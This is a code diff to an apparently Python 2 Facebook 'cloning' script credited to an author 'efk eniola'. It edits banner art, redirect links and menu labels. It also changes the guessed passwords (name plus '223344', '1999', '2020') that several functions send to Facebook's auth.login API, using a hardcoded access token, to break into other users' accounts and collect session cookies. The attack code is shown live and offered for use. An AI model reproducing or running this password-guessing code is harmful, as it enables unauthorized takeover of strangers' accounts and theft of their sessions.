@@ -82,10 +82,10 @@ logo = """
 \033[1;97m█----╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝----█ \033[1;0m
 \033[1;97m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ \033[1;0m
 \033[1;97m#######    #######   #          #
-\033[1;97m#                   #                  #       # 
+\033[1;97m#         #         #       # 
 \033[1;97m#######   #######   #   #
-\033[1;97m#                  #                  #       #
-\033[1;97m#######  #                  #           #
+\033[1;97m#        #         #       #
+\033[1;97m#######  #        #           #
 \033[1;97m____▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄_ \033[1;0m
 \033[1;97m───█▒▒░░░░░░░░░▒▒█─── \033[1;0m
 \033[1;97m────█░░█░░░░░█░░█──── \033[1;0m
@@ -104,7 +104,7 @@ logo = """
 \033[1;97m------------------------------------------------------------------------------------------------
 \033[1;93m➤\033[1;97m Author   : efk eniola
 \033[1;93m➤\033[1;97m Github   : https://github.com/eniolahacking
-\033[1;93m➤\033[1;97m Fb Id  : https://Facebook.itz.efk.3
+\033[1;93m➤\033[1;97m Fb Id  :https://www.facebook.com/itz.efk.3
 \033[1;97m---------------------------------------------------------------------------------------------------
 """
 
@@ -142,12 +142,12 @@ def tech_abm():
             login_choice()
         else:
             print ("\t [!] Password : "+passwordss+" (Wrong)")
-	    os.system('xdg-open https://facebook.com.itz.efk.3')
+	    os.system('xdg-open https://www.facebook.com/itz.efk.3')
             time.sleep(1)
             tech_abm()
     else:
         print ("\t [!] Username : "+username+" (Wrong)")
-	os.system('xdg-open https://facebook.com.itz.efk.3')
+	os.system('xdg-open https://www.facebook.com/itz.efk.3')
         time.sleep(1)
         tech_abm()
 	
@@ -157,8 +157,8 @@ def login_choice():
     os.system("python3 .loading.md")
     os.system('clear')
     print logo
-    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom Search Name Cloning     \033[1;97m(\033[1;92mno login\033[1;97m) ")
-    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom Ph.Number Cloning       \033[1;97m(\033[1;92mno login\033[1;97m) ")
+    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom Search Name Cloning(not working)     \033[1;97m(\033[1;92mno login\033[1;97m) ")
+    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom Ph.Number Cloning   (not working)    \033[1;97m(\033[1;92mno login\033[1;97m) ")
     print ("\033[1;97m[3]\033[1;91m-⋄-\033[1;97mClone Friendlist and Public ID \033[1;97m(\033[1;92mlogin\033[1;97m)    ")
     print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mExit") 
     print("\033[1;97m--------------------------------------------------")
@@ -209,7 +209,7 @@ def clone_loginvia():
         sav.write(token)
         sav.close()
         abm("\r\033[1;92m[✓] Login Successfull\033[0;97m")
-	os.system('xdg-open https://m.facebook.com/Techabm')
+	os.system('xdg-open https://www.facebook.com/itz.efk.3')
         time.sleep(1)
         menu()
     elif hack =="2":
@@ -474,7 +474,7 @@ def crack2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5= b['first_name'].lower()
+		                                    pass5= name+"223344"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
@@ -750,7 +750,7 @@ def bangla2():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6=b['first_name'].lower()
+		                                            pass6=name+"1999"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -969,7 +969,7 @@ def indiaa2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5= b['first_name'].lower()
+		                                    pass5=name+"2020"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
